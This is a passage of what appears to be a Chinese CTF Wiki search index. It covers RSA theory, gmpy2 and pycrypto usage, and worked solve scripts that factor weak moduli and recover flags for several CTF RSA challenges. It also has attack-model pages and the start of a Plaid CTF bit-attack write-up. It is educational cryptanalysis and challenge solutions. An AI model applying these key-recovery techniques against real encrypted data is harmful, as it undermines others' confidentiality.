b)</code>\uff0c\u8fd4\u56de\u4e00\u4e2a\u5143\u7ec4 <code>(x, y)</code>\uff0c\u5176\u4e2d <code>x</code> \u4e3a <code>a</code> \u5f00 <code>b</code> \u6b21\u65b9\u7684\u503c\uff0c<code>y</code> \u662f\u5224\u65ad <code>x</code> \u662f\u5426\u4e3a\u6574\u6570\u7684\u5e03\u5c14\u578b\u53d8\u91cf</li> </ul>"},{"location":"crypto/asymmetric/rsa/rsa_theory/#gmpy2","title":"gmpy2","text":"<p>\u5b89\u88c5\u65f6\uff0c\u53ef\u80fd\u4f1a\u9700\u8981\u81ea\u5df1\u53e6\u884c\u5b89\u88c5 mpfr \u4e0e mpc \u5e93\u3002</p> <ul> <li><code>gmpy2.iroot(a, b)</code>\uff0c\u7c7b\u4f3c\u4e8e <code>gmpy.root(a,b)</code></li> </ul>"},{"location":"crypto/asymmetric/rsa/rsa_theory/#pycrypto","title":"pycrypto","text":"<ul> <li> <p>\u5b89\u88c5</p> <pre><code>sudo pip install pycrypto\n</code></pre> </li> <li> <p>\u4f7f\u7528</p> <pre><code>import gmpy\nfrom Crypto.Util.number import *\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Cipher import PKCS1_v1_5\n\nmsg = 'crypto here'\np = getPrime(128)\nq = getPrime(128)\nn = p*q\ne = getPrime(64)\npubkey = RSA.construct((long(n), long(e)))\nprivatekey = RSA.construct((long(n), long(e), long(d), long(p), long(q)))\nkey = PKCS1_v1_5.new(pubkey)\nenc = key.encrypt(msg).encode('base64')\nkey = PKCS1_v1_5.new(privatekey)\nmsg = key.decrypt(enc.decode('base64'), e)\n</code></pre> </li> </ul>"},{"location":"crypto/asymmetric/rsa/rsa_theory/#jarvis-oj-basic-veryeasyrsa","title":"Jarvis OJ - Basic - veryeasyRSA","text":"<p>p = 3487583947589437589237958723892346254777 q = 8767867843568934765983476584376578389</p> <p>e = 65537</p> <p>\u6c42 d = </p> <p>\u8bf7\u63d0\u4ea4 <code>PCTF{d}</code></p> <p>\u76f4\u63a5\u6839\u636e ed\\equiv 1 \\pmod{\\varphi (N)}\uff0c\u5176\u4e2d \\varphi (N)=\\varphi (p)\\varphi (q)=(p-1)(q-1)\uff0c\u53ef\u5f97 d\u3002</p> <pre><code>import gmpy2\np = 3487583947589437589237958723892346254777\nq = 8767867843568934765983476584376578389\ne = 65537\nphin = (p - 1) * (q - 1)\nprint gmpy2.invert(e, phin)\n</code></pre> <pre><code>\u279c  Jarvis OJ-Basic-veryeasyRSA git:(master) \u2717 python exp.py       19178568796155560423675975774142829153827883709027717723363077606260717434369\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_theory/#2018-codegate-ctf-rsababy","title":"2018 CodeGate CTF Rsababy","text":"<p>\u7a0b\u5e8f\u5c31\u662f\u4e00\u4e2a\u7b80\u5355\u7684 RSA\uff0c\u4e0d\u8fc7\u7a0b\u5e8f\u8fd8\u751f\u6210\u4e86\u4e24\u4e2a\u5947\u602a\u7684\u6570</p> <pre><code>e = 65537\nn = p * q\npi_n = (p-1)*(q-1)\nd = mulinv(e, pi_n)\nh = (d+p)^(d-p)\ng = d*(p-0xdeadbeef)\n</code></pre> <p>\u6240\u4ee5\uff0c\u95ee\u9898\u5e94\u8be5\u51fa\u81ea\u8fd9\u91cc\uff0c\u6240\u4ee5\u6211\u4eec\u5c31\u4ece\u6b64\u4e0b\u624b\uff0c\u4e0d\u653e\u8fd9\u91cc\u5148\u5047\u8bbe <code>const = 0xdeadbeef</code>\u3002\u90a3\u4e48</p>  eg = ed * (p-const)  <p>\u8fdb\u800c\uff0c\u6839\u636e RSA \u53ef\u77e5</p>  2^{eg}=2^{ed * (p-const)}=2^{p-const} \\pmod n   2^{p-const} * 2^{const-1} = 2^{p-1} \\pmod n  <p>\u6240\u4ee5</p>  2^{p-1} = 2^{eg} * 2^{const-1}+kn  <p>\u800c\u4e0e\u6b64\u540c\u65f6\u6839\u636e\u8d39\u9a6c\u5c0f\u5b9a\u7406\uff0c\u6211\u4eec\u77e5\u9053</p>  2^{p-1} \\equiv 1 \\pmod p  <p>\u6240\u4ee5</p>  p|2^{p-1}-1 | 2^{eg+const-1}-1+kn  <p>\u8fdb\u800c</p>  p|2^{eg+const-1}-1  <p>\u6240\u4ee5</p>  p|gcd(2^{eg+const-1}-1,n)  <p>\u56e0\u6b64\uff0c\u4ee3\u7801\u5982\u4e0b</p> <pre><code>tmp = gmpy2.powmod(2,e*g+const-1,n)-1\np = gmpy2.gcd(tmp,n)\nq = n/p\nphin = (p-1)*(q-1)\nd =gmpy2.invert(e,phin)\nplain = gmpy2.powmod(data,d,n)\nprint hex(plain)[2:].decode('hex')\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_theory/#2018-pure-math","title":"2018 \u56fd\u5bb6\u5b89\u5168\u5468 pure math","text":"<p>\u9898\u76ee\u7684\u57fa\u672c\u63cf\u8ff0\u662f\u8fd9\u4e2a\u6837\u5b50\u7684</p> <pre><code>1) p ** p % q = 1137973316343089029387365135250835133803975869258714714790597743585251681751361684698632609164883988455302237641489036138661596754239799122081528662395492\n2) q ** q % p = 6901383184477756324584651464895743132603115552606852729050186289748558760692261058141015199261946483809004373728135568483701274908717004197776113227815323\n3) (p ** q + q ** p) % (p*q) = 16791287391494893024031688699360885996180880807427715700800644759680986120242383930558410147341340225420991368114858791447699399702390358184412301644459406\n4) (p+q) ** (p+q) % (p*q) = 63112211860889153729003401381621068190906433969243079543438386686621389392583849748240273643614258173423474299387234175508649197780206757067354426424570586101908571600743792328163163458500138799976944702155779196849585083397395750018148652864158388247163109077215394538930498877175474225571393901460434679279\n5) FLAG ** 31337 % (p*q) = 6931243291746179589612148118911670244427928875888377273917973305632621316868302667641610838193899081089153471883271406133321321416064760200919958612671379845738048938060512995550639898688604592620908415248701721672948126507753670027043162669545932921683579001870526727737212722417683610956855529996310258030\nNow, what\u2019s the FLAG???\n</code></pre> <p>\u6211\u4eec\u7684\u76ee\u7684\u57fa\u672c\u4e0a\u5c31\u662f\u6c42\u5f97 FLAG\uff0c\u90a3\u4e48\u600e\u4e48\u505a\u5462?\u8fd9\u4e2a\u9898\u76ee\u9700\u8981\u6211\u4eec\u5177\u6709\u8f83\u597d\u7684\u6570\u8bba\u529f\u5e95\u3002</p> <p>\u6839\u636e\u9898\u76ee\u4e2d\u8fd9\u6837\u7684\u5185\u5bb9\uff0c\u6211\u4eec\u53ef\u4ee5\u5047\u8bbe p\uff0cq \u90fd\u662f\u5927\u7d20\u6570\uff0c\u90a3\u4e48</p> <p>p^{q-1} \\equiv  1\\bmod q</p> <p>\u90a3\u4e48</p> <p>p^{q} \\equiv p \\bmod pq</p> <p>\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u6839\u636e 3\uff09\u77e5\u9053</p> <p>p^q+q^p \\equiv p+q \\bmod pq</p> <p>\u800c p+q \u53c8\u663e\u7136\u5c0f\u4e8e pq\uff0c\u6240\u4ee5\u6211\u4eec\u5c31\u77e5\u9053 p+q \u7684\u6570\u503c\u3002</p> <p>\u8fdb\u4e00\u6b65\uff0c\u6211\u4eec\u5047\u8bbe1\uff09\uff0c2\uff09\uff0c3\uff09\uff0c4\uff09\uff0c5\uff09\u5bf9\u5e94\u7684\u503c\u5206\u522b\u4e3a x_1, x_2, x_3, x_4, x_5 \u5219</p> <p>\u6839\u636e4\uff09\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053</p> <p>(p+q)^{p+q} \\equiv p^{p+q}+q^{p+q} \\bmod pq</p> <p>\u53c8\u56e0\u4e3a1\uff09\u548c 2\uff09\uff0c\u5219</p> <p>p^pp \\equiv px_1\\bmod pq</p> <p>q^qq \\equiv qx_2 \\bmod pq</p> <p>\u56e0\u6b64</p> <p>px_1+qx_2 \\equiv x_4 \\bmod pq</p> <p>\u6839\u636e x_1 \u548c x_2 \u7684\u6c42\u5f97\u65b9\u5f0f\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u8fd9\u91cc\u4e5f\u662f\u7b49\u53f7\uff0c\u56e0\u6b64\u6211\u4eec\u5f97\u5230\u4e86\u4e00\u4e2a\u4e8c\u5143\u4e00\u6b21\u65b9\u7a0b\u7ec4\uff0c\u76f4\u63a5\u6c42\u89e3\u5373\u53ef\u3002</p> <pre><code>import gmpy2\nx1 = 1137973316343089029387365135250835133803975869258714714790597743585251681751361684698632609164883988455302237641489036138661596754239799122081528662395492\nx2 = 6901383184477756324584651464895743132603115552606852729050186289748558760692261058141015199261946483809004373728135568483701274908717004197776113227815323\np_q = 16791287391494893024031688699360885996180880807427715700800644759680986120242383930558410147341340225420991368114858791447699399702390358184412301644459406\nx4 = 63112211860889153729003401381621068190906433969243079543438386686621389392583849748240273643614258173423474299387234175508649197780206757067354426424570586101908571600743792328163163458500138799976944702155779196849585083397395750018148652864158388247163109077215394538930498877175474225571393901460434679279\n\nif (x4 - x1 * p_q) % (x2 - x1) == 0:\n    print 'True'\nq = (x4 - x1 * p_q) / (x2 - x1)\nprint q\np = p_q - q\n\nc = 6931243291746179589612148118911670244427928875888377273917973305632621316868302667641610838193899081089153471883271406133321321416064760200919958612671379845738048938060512995550639898688604592620908415248701721672948126507753670027043162669545932921683579001870526727737212722417683610956855529996310258030\n\nphin = (p - 1) * (q - 1)\nd = gmpy2.invert(31337, phin)\nflag = gmpy2.powmod(c, d, p * q)\nflag = hex(flag)[2:]\nprint flag.decode('hex')\n</code></pre> <p>flag  \u5982\u4e0b</p> <pre><code>\u279c  2018-\u56fd\u5bb6\u5b89\u5168\u5468\u7b2c\u4e00\u573a-puremath git:(master) \u2717 python exp.py\nTrue\n7635093784603905632817000902311635311970645531806863592697496927519352405158721310359124595712780726701027634372170535318453656286180828724079479352052417\nflag{6a66b8d5-6047-4299-a48e-4c4d1f874d12}\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_theory/#2018-pwnhub-lhy","title":"2018 Pwnhub LHY","text":"<p>\u9996\u5148\u5206\u6790\u8fd9\u6bb5\u4ee3\u7801</p> <pre><code>assert gmpy.is_prime(y)**2016 + gmpy.is_prime(x + 1)**2017 + (\n    (x**2 - 1)**2 % (2 * x * y - 1) + 2\n)**2018 == 30097557298197417800049182668952226601954645169633891463401117760245367082644152355564014438095421962150109895432272944128252155287648477680131934943095113263121691874508742328500559321036238322775864636883202538152031804102118831278605474474352011895348919417742923873371980983336517409056008233804190890418285814476821890492630167665485823056526646050928460488168341721716361299816947722947465808004305806687049198633489997459201469227952552870291934919760829984421958853221330987033580524592596407485826446284220272614663464267135596497185086055090126893989371261962903295313304735911034185619611156742146\n</code></pre> <p>\u7531\u4e8e <code>gmpy.is_prime</code> \u8981\u4e48\u8fd4\u56de1\uff0c\u8981\u4e48\u8fd4\u56de 0\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5f88\u5bb9\u6613\u5730\u8bd5\u51fa\u6765 <code>y</code> \u662f\u7d20\u6570\uff0c<code>x+1</code> \u4e5f\u662f\u7d20\u6570\uff0c\u5e76\u4e14</p> <p>(x^2-1)^2\\equiv 0 \\bmod (2xy-1)</p> <p>\u4e3a\u4e86\u5f0f\u5b50\u80fd\u591f\u6574\u9664\uff0c\u731c\u6d4b x=2y \u3002</p> <p>\u4e8e\u662f\uff0c\u5bf9\u4e8e\u4e0b\u9762\u7684\u5185\u5bb9</p> <pre><code>p = gmpy.next_prime(x**3 + y**3)\nq = gmpy.next_prime(x**2 * y + y**2 * x)\nn = p * q\nphi = (p - 1) * (q - 1)\nd = gmpy.invert(0x10001, phi)\nenc = pow(bytes_to_long(flag), 0x10001, n)\nprint 'n =', n\nprint 'enc =', enc\n</code></pre> <p>p \u548c q \u81ea\u7136\u4e3a</p> <p>p=next\\_prime(9y^3)</p> <p>q=next\\_prime(6y^3)</p> <p>\u6839\u636e\u7d20\u6570\u7684\u95f4\u9694\uff0c\u53ef\u4ee5\u77e5\u9053 p \u548c q \u6700\u591a\u6bd4\u62ec\u53f7\u91cc\u7684\u6570\u5b57\u5927\u4e00\u70b9\uff0c\u8fd9\u91cc\u4e00\u822c\u4e0d\u4f1a\u8d85\u8fc7 1000\u3002</p> <p>\u90a3\u4e48</p> <p>n \\geq 54y^6</p> <p>\u6240\u4ee5\u6211\u4eec\u77e5\u9053\u4e86 y \u7684\u4e0a\u754c\uff0c\u800c\u5bf9\u4e8e y \u7684\u4e0b\u754c\u5176\u5b9e\u4e5f\u4e0d\u4f1a\u79bb\u4e0a\u754c\u592a\u8fdc\uff0c\u6211\u4eec\u5927\u6982\u51cf\u4e2a\u51e0\u5341\u4e07\u3002\u8fdb\u800c\uff0c\u6211\u4eec\u5229\u7528\u4e8c\u5206\u67e5\u627e\u7684\u65b9\u5f0f\u6765\u5bfb\u627e p \u548c q\uff0c\u5982\u4e0b</p> <pre><code>import gmpy2\ntmp = 30097557298197417800049182668952226601954645169633891463401117760245367082644152355564014438095421962150109895432272944128252155287648477680131934943095113263121691874508742328500559321036238322775864636883202538152031804102118831278605474474352011895348919417742923873371980983336517409056008233804190890418285814476821890492630167665485823056526646050928460488168341721716361299816947722947465808004305806687049198633489997459201469227952552870291934919760829984421958853221330987033580524592596407485826446284220272614663464267135596497185086055090126893989371261962903295313304735911034185619611156742146\n\nprint gmpy2.iroot(tmp, 2018)\nprint gmpy2.iroot(tmp - 1, 2018)\n\nprint gmpy2.iroot(tmp - 2, 2018)\n\nn = 260272753019642842691231717156206014402348296256668058656902033827190888150939144319270903947159599144884859205368557385941127216969379550487700198771513118894125094678559478972591331182960004648132846372455712958337042783083099376871113795475285658106058675217077803768944674144803250791799957440111855021945690877200606577646234107957498370758707097662736662439460472126493593605957225541979181422479704018055731221681621886820626215670393536343427267329350730257979042198593215747542270975288047196483958369426727778580292311145109908665004662296440533724591193527886702374790526322791818523938910660223971454070731594803459613066617828657725704376475527288174777197739360634209448477565044519733575375490101670974499385760735451471034271880800081246883157088501597655371430353965493264345172541221268942926210055390568364981514774743693528424196241142665685211916330254113610598390909248626686397970038848966187547231199741\n\ny = 191904757378974300059526915134037747982760255307942501070454569331878491189601823952845623286161325306079772871025816081849039036850918375408172174102720702781463514549851887084613000000L\ny = gmpy2.next_prime(y)\n\nenc = 73933313646416156737449236838459526871566017180178176765840447023088664788672323530940171469589918772272559607026808711216932468486201094786991159096267208480969757088208089800600731106685561375522764783335332964711981392251568543122418192877756299395774738176188452197889668610818741062203831272066261677731889616150485770623945568369493256759711422067551058418926344060504112146971937651406886327429318390247733970549845424064244469193626197360072341969574784310397213033860597822010667926563087858301337091484951760613299203587677078666096526093414014637559237148644939541419075479462431789925219269815364529507771308181435591670281081465439913711912925412078002618729159141400730636976744132429329651487292506365655834202469178066850282850374067239317928012461993443785247524500680257923687511378073703423047348824611101206633407452837948194591695712958510124436821151767823443033286425729473563002691262316964646014201612\n\nend = gmpy2.iroot(n / 54, 6)[0]\nbeg = end - 2000000\n\nmid = 1\nwhile beg &lt; end:\n    mid = (beg + end) / 2\n    if gmpy2.is_prime(mid) != 1:\n        mid = gmpy2.next_prime(mid)\n    p = gmpy2.next_prime(9 * mid**3)\n    q = gmpy2.next_prime(6 * mid**3)\n    n1 = p * q\n    if n1 == n:\n        print p, q\n        phin = (p - 1) * (q - 1)\n        d = gmpy2.invert(0x10001, phin)\n        m = gmpy2.powmod(enc, d, n)\n        print hex(m)[2:].strip('L').decode('hex')\n        print 'ok'\n        exit(0)\n    elif n1 &lt; n:\n        beg = mid\n    else:\n        end = mid\n    print beg, end\n</code></pre>"},{"location":"crypto/attack-summary/attack-mode/","title":"\u7b80\u4ecb","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"crypto/attack-summary/attack-mode/#_2","title":"\u653b\u51fb\u6a21\u5f0f","text":"<p>\u5728\u6211\u4eec\u653b\u51fb\u4e00\u4e2a\u5bc6\u7801\u5b66\u7cfb\u7edf\u65f6\uff0c\u6211\u4eec\u6216\u591a\u6216\u5c11\u4f1a\u5f97\u5230\u5173\u4e8e\u8fd9\u4e2a\u7cfb\u7edf\u7684\u4e00\u4e9b\u4fe1\u606f\u3002\u6839\u636e\u5f97\u5230\u4fe1\u606f\u91cf\u7684\u4e0d\u540c\uff0c\u6211\u4eec\u53ef\u4ee5\u91c7\u7528\u7684\u65b9\u6cd5\u5c31\u53ef\u80fd\u4e0d\u540c\u3002\u5728\u5f53\u4eca\u7684\u5bc6\u7801\u5b66\u5206\u6790\u65f6\uff0c\u4e00\u822c\u6211\u4eec\u90fd\u4f1a\u5047\u8bbe\u653b\u51fb\u8005\u77e5\u9053\u5bc6\u7801\u5b66\u7b97\u6cd5\uff0c\u8fd9\u4e2a\u5047\u8bbe\u662f\u5408\u7406\u7684\uff0c\u56e0\u4e3a\u5386\u53f2\u4e0a\u6709\u5f88\u591a\u4fdd\u5bc6\u7684\u7b97\u6cd5\u6700\u540e\u90fd\u88ab\u4eba\u6240\u77e5\uff0c\u6bd4\u5982 RC4\u3002\u88ab\u77e5\u9053\u7684\u65b9\u5f0f\u591a\u91cd\u591a\u6837\uff0c\u6bd4\u5982\u95f4\u8c0d\uff0c\u9006\u5411\u5de5\u7a0b\u7b49\u3002</p> <p>\u8fd9\u91cc\u6211\u4eec\u6839\u636e\u653b\u51fb\u8005\u83b7\u53d6\u5bc6\u7801\u5b66\u7cfb\u7edf\u7684\u4fe1\u606f\u7684\u591a\u5c11\u5c06\u653b\u51fb\u6a21\u5f0f\u5206\u4e3a\u4ee5\u4e0b\u51e0\u7c7b</p> <ul> <li>\u552f\u5bc6\u6587\u653b\u51fb\uff1a\u653b\u51fb\u8005\u4ec5\u80fd\u83b7\u5f97\u4e00\u4e9b\u52a0\u5bc6\u8fc7\u7684\u5bc6\u6587\u3002</li> <li>\u5df2\u77e5\u660e\u6587\u653b\u51fb\uff1a\u653b\u51fb\u8005\u6709\u4e00\u4e9b\u5bc6\u6587\u5bf9\u5e94\u7684\u660e\u6587\u3002</li> <li>\u9009\u62e9\u660e\u6587\u653b\u51fb\uff1a\u653b\u51fb\u8005\u5728\u5f00\u59cb\u653b\u51fb\u65f6\u53ef\u4ee5\u9009\u62e9\u4e00\u4e9b\u660e\u6587\uff0c\u5e76\u83b7\u53d6\u52a0\u5bc6\u540e\u7684\u5bc6\u6587\u3002\u5982\u679c\u653b\u51fb\u8005\u5728\u653b\u51fb\u4e2d\u9014\u53ef\u4ee5\u6839\u636e\u5df2\u7ecf\u83b7\u53d6\u7684\u4fe1\u606f\u9009\u62e9\u65b0\u7684\u660e\u6587\u5e76\u83b7\u53d6\u5bf9\u5e94\u7684\u5bc6\u6587\uff0c\u5219\u79f0\u4e3a\u9002\u5e94\u6027\u9009\u62e9\u660e\u6587\u653b\u51fb\u3002</li> <li>\u9009\u62e9\u5bc6\u6587\u653b\u51fb\uff1a\u653b\u51fb\u8005\u5728\u5f00\u59cb\u653b\u51fb\u4e4b\u524d\u53ef\u4ee5\u9009\u62e9\u4e00\u4e9b\u5bc6\u6587\uff0c\u5e76\u83b7\u53d6\u89e3\u5bc6\u540e\u7684\u660e\u6587\u3002\u5982\u679c\u653b\u51fb\u8005\u5728\u653b\u51fb\u56fe\u4e2d\u53ef\u4ee5\u6839\u636e\u5df2\u7ecf\u83b7\u53d6\u7684\u4fe1\u606f\u9009\u62e9\u4e00\u4e9b\u65b0\u7684\u5bc6\u6587\u5e76\u83b7\u53d6\u5bf9\u5e94\u7684\u660e\u6587\uff0c\u5219\u79f0\u4e3a\u9002\u5e94\u6027\u9009\u62e9\u5bc6\u6587\u653b\u51fb\u3002</li> <li>\u76f8\u5173\u5bc6\u94a5\u653b\u51fb\uff1a\u653b\u51fb\u8005\u53ef\u4ee5\u83b7\u5f97\u4e24\u4e2a\u6216\u591a\u4e2a\u76f8\u5173\u5bc6\u94a5\u7684\u52a0\u5bc6\u6216\u89e3\u5bc6\u540e\u7684\u5bc6\u6587\u6216\u660e\u6587\u3002\u4f46\u662f\u653b\u51fb\u8005\u4e0d\u77e5\u9053\u8fd9\u4e9b\u5bc6\u94a5\u3002</li> </ul>"},{"location":"crypto/attack-summary/attack-mode/#_3","title":"\u5e38\u89c1\u653b\u51fb\u65b9\u6cd5","text":"<p>\u6839\u636e\u4e0d\u540c\u7684\u653b\u51fb\u6a21\u5f0f\uff0c\u53ef\u80fd\u4f1a\u6709\u4e0d\u540c\u7684\u653b\u51fb\u65b9\u6cd5\uff0c\u76ee\u524d\u5e38\u89c1\u7684\u653b\u51fb\u65b9\u6cd5\u4e3b\u8981\u6709</p> <ul> <li>\u66b4\u529b\u653b\u51fb</li> <li>\u4e2d\u95f4\u76f8\u9047\u653b\u51fb</li> <li>\u7ebf\u6027\u5206\u6790</li> <li>\u5dee\u5206\u5206\u6790</li> <li>\u4e0d\u53ef\u80fd\u5dee\u5206\u5206\u6790</li> <li>\u79ef\u5206\u5206\u6790</li> <li>\u4ee3\u6570\u5206\u6790</li> <li>\u76f8\u5173\u5bc6\u94a5\u653b\u51fb</li> <li>\u4fa7\u4fe1\u9053\u653b\u51fb</li> </ul>"},{"location":"crypto/attack-summary/attack-mode/#_4","title":"\u53c2\u8003\u6587\u732e","text":"<ul> <li>https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A0%81%E5%88%86%E6%9E%90</li> </ul>"},{"location":"crypto/attack-summary/bit-attack/","title":"\u6bd4\u7279\u653b\u51fb","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"crypto/attack-summary/bit-attack/#_2","title":"\u6982\u8ff0","text":"<p>\u7b80\u5355\u5730\u8bf4\uff0c\u5c31\u662f\u5229\u7528\u6bd4\u7279\u4f4d\u4e4b\u95f4\u7684\u5173\u7cfb\u8fdb\u884c\u653b\u51fb\u3002</p>"},{"location":"crypto/attack-summary/bit-attack/#2018-plaid-ctf-transducipher","title":"2018 Plaid CTF transducipher","text":"<p>\u9898\u76ee\u5982\u4e0b</p> <pre><code>#!/usr/bin/env python3.6\nimport os\n\nBLOCK_SIZE = 64\n\nT = [\n    ((2, 1), 1),\n    ((5, 0), 0),\n    ((3, 4), 0),\n    ((1, 5), 1),\n    ((0, 3), 1),\n    ((4, 2), 0),\n]\n\n\ndef block2bin(b, length=BLOCK_SIZE):\n    return list(map(int, bin(b)[2:].rjust(length, '0')))\n\n\ndef bin2block(b):\n    return int(\"\".join(map(str, b)), 2)\n\n\ndef transduce(b, s=0):\n    if len(b) == 0:\n        return b\n    d, t = T[s]\n    b0, bp = b[0], b[1:]\n    return [b0 ^ t] + transduce(bp, s=d[b0])\n\n\ndef transduceblock(b):\n    return bin2block(transduce(block2bin(b)))\n\n\ndef swap(b):\n    l = BLOCK_SIZE // 2\n    m = (1 &lt;&lt; l) - 1\n    return (b &gt;&gt; l) | ((b &amp; m) &lt;&lt; l)\n\n\nclass Transducipher:\n\n    def __init__(self, k):\n        self.k = [k]\n        for i in range(1, len(T)):\n            k = swap(transduceblock(k))\n            self.k.append(k)\n\n    def encrypt(self, b):\n        for i in range(len(T)):\n            b ^= self.k[i]\n            b = transduceblock(b)\n            b = swap(b)\n        return b\n\n\nif __name__ == \"__main__\":\n    flag = bytes.hex(os.urandom(BLOCK_SIZE // 8))\n    k = int(flag, 16)\n    C = Transducipher(k)\n    print(\"Your flag is PCTF{%s}\" % flag)\n    with open(\"data1.txt\", \"w\") as f:\n        for i in range(16):\n            pt = int(bytes.hex(os.urandom(BLOCK_SIZE // 8)), 16)\n            ct = C.encrypt(pt)\n            f.write(str((pt, ct)) + \"\\n\")\n</code></pre> <p>\u9898\u76ee\u7ed9\u4e86 16 \u7ec4\u660e\u5bc6\u6587\u5bf9</p> <ul> <li>\u660e\u6587\u5927\u5c0f 8 \u4e2a\u5b57\u8282</li> <li>\u5bc6\u6587\u5927\u5c0f 8 \u4e2a\u5b57\u8282</li> <li>\u5bc6\u94a5\u5927\u5c0f\u4e5f\u662f 8 \u4e2a\u5b57\u8282</li> </ul> <p>\u6211\u4eec\u6240\u9700\u8981\u6c42\u89e3\u7684\u5c31\u662f\u5bc6\u94a5\u3002</p> <p>\u53ef\u4ee5\u770b\u5230\u8fd9\u91cc\u4e3b\u8981\u6709\u4e24\u79cd\u57fa\u672c\u64cd\u4f5c</p> <ul> <li>swap</li> </ul> <pre><code>def swap(b):\n    l = BLOCK_SIZE // 2\n    m = (1 &lt;&lt; l) - 1\n    return (b &gt;&gt; l) | ((b &amp; m) &lt;&lt; l)\n</code></pre> <p>\u5c06\u7ed9\u5b9a\u7684\u6570\u636e\u7684\u9ad8 32 \u4f4d\u4e0e\u4f4e 32 \u4f4d\u4ea4\u6362\u3002</p> <ul> <li>transduce</li> </ul> <pre><code>T = [\n    ((2, 1), 1),\n    ((5, 0), 0),\n    ((3, 4), 0),\n    ((1, 5), 1),\n    ((0, 3), 1),\n    ((4, 2), 0),\n]\ndef transduce(b, s=0):\n    if len(b) == 0:\n        return b\n    d, t = T[s]\n    b0, bp = b[0], b[1:]\n    return [b0 ^ t] + transduce(bp, s=d[b0])\n</code></pre> <p>\u5176\u4e2d\uff0c</p> <ul> <li>b \u662f\u4e00\u4e2a 01 \u6570\u7ec4\uff0c\u521d\u59cb\u65f6\u523b\u5927\u5c0f\u4e3a 64\u3002</li> <li>s \u662f\u4e00\u4e2a\u4e0b\u6807\u3002</li> </ul> <p>\u57fa\u672c\u6d41\u7a0b\u5982\u4e0b</p> <ol> <li>\u6839\u636e s \u9009\u62e9\u4f7f\u7528 T \u7684\u54ea\u4e2a\u5143\u7d20\uff0c\u8fdb\u800c\u5c06\u5176\u5206\u4e3a d \u548c t\u3002</li> <li>\u5c06 b \u5206\u4e3a\u4e24\u90e8\u5206\uff0c\u4e00\u90e8\u5206\u53ea\u5305\u542b\u5934\u5143\u7d20\uff0c\u53e6\u4e00\u90e8\u5206\u5305\u542b\u5176\u5b83\u7684\u5143\u7d20\u3002</li> <li>\u5c06\u5934\u5143\u7d20\u4e0e t \u5f02\u6216\u4f5c\u4e3a\u5f53\u524d\u7684\u5934\u5143\u7d20\uff0c\u7136\u540e\u7ee7\u7eed\u8f6c\u6362\u5269\u4e0b\u7684\u90e8\u5206\u3002</li> </ol> <p>\u5176\u5b9e\u6211\u4eec\u53ef\u4ee5\u5c06\u8be5\u51fd\u6570\u8f6c\u6362\u4e3a\u8fed\u4ee3\u51fd\u6570</p> <pre><code>def transduce_iter(b, s=0):\n    ans = []\n    for c in b:\n        d, t = T[s]\n        ans += [c ^ t]\n        s = d[c]\n    return ans\n</code></pre> <p>\u8fdb\u800c\u7531\u4e8e\u6bcf\u6b21\u5904\u7406\u7684\u662f\u5217\u8868\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\uff0c\u5176\u5b9e\u8be5\u51fd\u6570\u662f\u53ef\u9006\u7684\uff0c\u5982\u4e0b</p> <pre><code>def invtransduce(b, s=0):\n    if len(b) == 0:\n        return b\n    d, t = T[s]\n    b0, bp = b[0], b[1:]\n    return [b0 ^ t] + transduce(bp, s=d[b0 ^ t])\n</code></pre> <p>\u4e0b\u9762\u5206\u6790\u7a0b\u5e8f\u7684\u6838\u5fc3\u6d41\u7a0b\uff0c\u9996\u5148\u662f\u751f\u6210\u5bc6\u94a5\u90e8\u5206\uff0c\u8be5\u52a0\u5bc6\u7b97\u6cd5\u751f\u6210\u4e86 6 \u4e2a\u5bc6\u94a5\uff0c\u6bcf\u6b21\u751f\u6210\u7684\u65b9\u6cd5</p> <ol> <li>transduce \u5148\u524d\u7684\u5bc6\u94a5\u5f97\u5230\u4e2d\u95f4\u503c t</li> <li>\u5bf9 t \u8fdb\u884c swap</li> <li>\u8fde\u7eed\u8fed\u4ee3 5 \u6b21</li> </ol> <pre><code>    def __init__(self, k):\n        self.k = [k]\n        for i in range(1, len(T)):\n            k = swap(transduceblock(k))\n            self.k.append(k)\n</code></pre> <p>\u52a0\u5bc6\u7b97\u6cd5\u5982\u4e0b\uff0c\u4e00\u5171\u8fed\u4ee3 6 \u8f6e\uff0c\u57fa\u672c\u6d41\u7a0b</p> <ol> <li>\u5f02\u6216\u5bc6\u94a5 transduce</li> <li>\u4ea4\u6362</li> </ol> <pre><code>    def encrypt(self, b):\n        for i in range(len(T)):\n            b ^= self.k[i]\n            b = transduceblock(b)\n            b = swap(b)\n        return b\n</code></pre> <p>\u901a\u8fc7\u5206\u6790\u7a0b\u5e8f\uff0c\u53ef\u77e5\u8be5\u52a0\u5bc6\u7b97\u6cd5\u662f\u4e00\u4e2a\u5757\u52a0\u5bc6\uff0c\u57fa\u672c\u4fe1\u606f\u5982\u4e0b</p> <ul> <li>\u5757\u5927\u5c0f\u4e3a 8 \u4e2a\u5b57\u8282</li> <li>\u8f6e\u6570\u4e3a 6 \u8f6e</li> <li>\u52a0\u5bc6\u7b97\u6cd5\u7684\u6bcf\u8f6e\u7684\u57fa\u672c\u64cd\u4f5c\u4e3a transduce \u548c swap\u3002</li> <li>\u5bc6\u94a5\u7684\u6269\u5c55\u4e5f\u662f\u4e0e transduce \u548c swap \u76f8\u5173\u3002</li> </ul> <p>\u66f4\u5177\u4f53\u7684</p> <ol> <li>swap \u662f\u5c06 8 \u5b57\u8282\u7684\u9ad8 32 \u4f4d\u4e0e\u4f4e 32 \u4f4d\u8fdb\u884c\u8c03\u6362\u3002</li> <li>transduce \u662f\u5bf9\u4e8e 8 \u5b57\u8282\u7684\u6bcf\u4e2a\u6bd4\u7279\uff0c\u9010\u6bd4\u7279\u4e0e\u67d0\u4e2a\u503c\u8fdb\u884c\u5f02\u6216\u3002\u8fd9\u4e2a\u503c\u4e0e 